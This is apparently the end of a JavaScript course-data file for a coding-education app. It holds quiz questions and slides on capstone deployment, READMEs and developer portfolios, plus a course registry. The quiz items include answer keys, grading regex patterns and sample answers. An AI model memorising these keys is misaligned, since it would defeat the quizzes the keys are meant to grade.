          { difficulty: "advanced", type: "freeform", q: "Design the database schema (tables and relationships) for a simple e-commerce capstone with users, products, orders, and order items.", starterCode: "// Database Schema:\n// Table: users\n//   columns: \n// Table: products\n//   columns: \n// Table: orders\n//   columns: \n// Table: order_items\n//   columns: ", patterns: ["users.*id|id.*users", "products.*id|id.*products", "orders.*userId|userId.*orders|user_id", "order_items.*orderId|orderId.*order_items|order_id", "order_items.*productId|productId.*order_items|product_id"], sampleAnswer: "// Database Schema:\n// Table: users\n//   columns: id (PK), name, email (unique), passwordHash, createdAt\n// Table: products\n//   columns: id (PK), name, description, price, stock, imageUrl\n// Table: orders\n//   columns: id (PK), userId (FK -> users), total, status, createdAt\n// Table: order_items\n//   columns: id (PK), orderId (FK -> orders), productId (FK -> products), quantity, price" },
          { difficulty: "advanced", q: "Your capstone works on localhost but you have 2 weeks until the portfolio deadline. What should you prioritize?", options: ["Adding more features to impress", "Deploying what works, writing tests, and polishing the README - a deployed MVP beats an unfinished project", "Rewriting the entire frontend in a new framework", "Only working on CSS animations"], answer: 1 },
          { difficulty: "advanced", type: "output", q: "A reviewer looks at your capstone repo. Which signal is a red flag?", code: "// Repo A: 47 commits like:\n// \"feat: add user auth\", \"fix: login validation\",\n// \"test: add unit tests for auth\"\n\n// Repo B: 3 commits like:\n// \"initial commit\", \"stuff\", \"final\"", options: ["Repo A has too many commits", "Repo B - poor commit history suggests messy workflow and no iterative development", "Both repos look professional", "Commit messages do not matter"], answer: 1 },
        ]
      },
      {
        title: "Deployment & Portfolio",
        slides: [
          { type: "teach", content: "Deploy your capstone to a **custom domain** with HTTPS. Write a compelling **README**: project description, screenshots, tech stack, setup instructions.", highlight: "README" },
          { type: "teach", content: "Build your **portfolio**: deploy 3\u20135 projects, write clean commit history, add a portfolio website. Your GitHub profile IS your resume in tech.", highlight: "portfolio" },
        ],
        questions: [
          { type: "order", q: "Arrange steps to launch your portfolio:", lines: ["Build 3-5 polished projects", "Write READMEs with screenshots", "Deploy projects to live URLs", "Create a portfolio site linking them all"], correctOrder: [0, 1, 2, 3] },
          { q: "A good project README includes:", options: ["Only the title", "Description, screenshots, tech stack, and setup instructions", "Just a link", "The entire source code"], answer: 1 },
          { q: "Your GitHub profile is important because:", options: ["It replaces your ID card", "Employers review it as a technical resume", "It makes code run faster", "It's required by law"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "Which portfolio project list is more impressive to employers?", code: "// Portfolio A:\n// 1. Todo app (HTML/CSS/JS)\n// 2. Calculator (HTML/CSS/JS)\n// 3. Clock widget (HTML/CSS/JS)\n\n// Portfolio B:\n// 1. E-commerce store (React + Node + Postgres)\n// 2. Real-time chat app (React + WebSockets)\n// 3. API dashboard (React + Chart.js + Auth)", options: ["Portfolio A - simpler projects show fundamentals", "Portfolio B - shows range of skills, full-stack ability, and real-world complexity", "Both are equally impressive", "Neither matters if you have a degree"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the README sections:", code: "# Project Name\n\n## ___BLANK1___\nA brief description of what the app does.\n\n## Tech Stack\nReact, Node.js, PostgreSQL\n\n## ___BLANK2___\n```bash\ngit clone ...\nnpm install\nnpm run dev\n```", blanks: [{ id: "BLANK1", options: ["Code", "Description", "License", "History"], answer: 1 }, { id: "BLANK2", options: ["Getting Started", "Conclusion", "References", "Credits"], answer: 0 }] },
          { difficulty: "average", q: "Your deployed project URL returns a 502 error. What should you check first?", options: ["The CSS file", "Server logs on the hosting platform for crash errors", "Your local development server", "The README file"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write a compelling README description for a weather dashboard project. Include: what it does, key features, and what technologies it demonstrates.", starterCode: "# WeatherDash\n\n## Description\n\n## Key Features\n- \n\n## Built With\n- ", patterns: ["weather|forecast|temperature", "React|frontend|dashboard", "API|fetch|data", "feature|real-time|search|location"], sampleAnswer: "# WeatherDash\n\n## Description\nA real-time weather dashboard that displays current conditions, 5-day forecasts, and interactive maps for any city worldwide.\n\n## Key Features\n- Search any city with autocomplete\n- 5-day forecast with hourly breakdowns\n- Interactive radar maps\n- Responsive design for mobile and desktop\n- Geolocation for automatic local weather\n\n## Built With\n- React 18 with hooks\n- OpenWeather API\n- Leaflet.js for maps\n- CSS Modules for styling" },
          { difficulty: "advanced", q: "What makes a portfolio project stand out to a hiring manager compared to tutorial follow-alongs?", options: ["Using the latest framework version", "Having a unique concept, clean code, deployed URL, tests, and a README that explains your design decisions", "More lines of code", "Using as many libraries as possible"], answer: 1 },
          { difficulty: "advanced", type: "order", q: "Arrange these portfolio improvements from highest to lowest impact:", lines: ["Deploy all projects to live URLs", "Write clear READMEs with screenshots", "Add tests to demonstrate quality", "Use meaningful git commit messages", "Add custom domain to main project"], correctOrder: [0, 1, 2, 3, 4] },
        ]
      }
    ]
  }
];

export const COURSES = {
  fullstack: {
    id: "fullstack",
    title: "Full Stack Development",
    icon: "\u{1F5A5}\uFE0F",
    desc: "HTML \u2192 CSS \u2192 JS \u2192 React \u2192 Node \u2192 Deploy",
    color: "#58CC02",
    modules: FULLSTACK_MODULES,
  },
  python: {
    id: "python",
    title: "Python Programming",
    icon: "\u{1F40D}",
    desc: "From basics to real-world projects",
    color: "#3776AB",
    modules: PYTHON_MODULES,
  },
  dsa: {
    id: "dsa",
    title: "Data Structures & Algorithms",
    icon: "\u{1F9EE}",
    desc: "Think like a computer scientist",
    color: "#E74C3C",
    modules: [...DSA_PART1, ...DSA_PART2],
  },
};

export const getModules = (courseId) => COURSES[courseId]?.modules || [];
export const getTotalLessons = (courseId) => getModules(courseId).reduce((s, m) => s + m.lessons.length, 0);
